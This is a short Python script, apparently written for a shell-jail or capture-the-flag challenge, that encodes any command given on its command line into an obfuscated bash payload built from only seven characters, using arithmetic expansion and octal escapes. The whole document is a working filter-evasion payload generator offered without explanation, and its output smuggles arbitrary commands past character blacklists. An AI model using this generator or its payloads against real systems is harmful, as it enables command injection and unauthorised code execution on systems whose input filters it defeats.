#!/usr/bin/env python3

import subprocess
import sys

'''
chars used: $ [ ] \\ _ ' < (7 chars)
'''

e=lambda x:'$[%s]'%x

m={}
m['0']=e("")
m['1']=e("%s<%s"%(m['0'],"$$"))

neg = lambda x: e('10000000000000000000000000000000<<100000').replace('1',m['1']).replace('0',m['0'])+x

m['-1']=e(neg(m['1']))
m['10']=e("%s%s"%(m['1'],m['0']))

for i in range(9,1,-1):
	m[str(i)]=e("%s%s"%(m[str(i+1)],m['-1']))

def escapeChar(c):
	a =oct(ord(c))[2:]
	return "\\\\\\\\%s"% (''.join([m[n] for n in a]))

def escape(s):
	return "\\$\\\\\\'%s\\\\\\'" %("".join([escapeChar(c) for c in s]))

if len(sys.argv) < 2:
    exit()
payload = "$_<<<\$$[]\\<\\<\\<\$$[]\\\\\\<\\\\\\<\\\\\\<%s"%(escape(" ".join(sys.argv[1:])))
print(payload)
